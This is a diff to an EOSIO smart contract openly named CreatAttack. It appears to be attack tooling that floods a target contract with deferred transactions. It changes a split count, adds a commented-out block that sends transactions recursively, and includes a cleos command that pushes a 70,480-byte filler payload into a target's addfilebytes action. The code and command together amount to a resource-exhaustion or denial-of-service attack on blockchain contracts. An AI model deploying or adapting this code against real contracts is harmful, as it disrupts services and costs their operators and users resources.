@@ -19,7 +19,7 @@ class [[eosio::contract]] CreatAttack : public eosio::contract {
             transaction out1{};
             transaction target{};
 
-            int N = 6; // N division
+            int N = 1; // N division
 
             /////////////// TARGET CONTRACT METHOD ARGUMENT //////////
             // cleos push action provider addfilebytes "[8,`python -c 'print \"B\"*70480'`,70480]" -p client@active
@@ -57,6 +57,14 @@ class [[eosio::contract]] CreatAttack : public eosio::contract {
         void func(name client, name target ,uint64_t idx)
         {
             auto argu = std::make_tuple(client, target , uint64_t(idx));
+			/*
+			int N = 1;
+			transaction out{};
+			out.actions.emplace_back(permission_level{currentContract, "active"_n},\
+					currentContract , "main"_n, std::make_tuple(currentContract, uint64_t(idx + N)));
+			out.delay_sec = 0;
+			out.send((idx+N), currentContract, false);
+			*/
             transaction out{};
             out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, argu );
             out.send((idx), client, false);
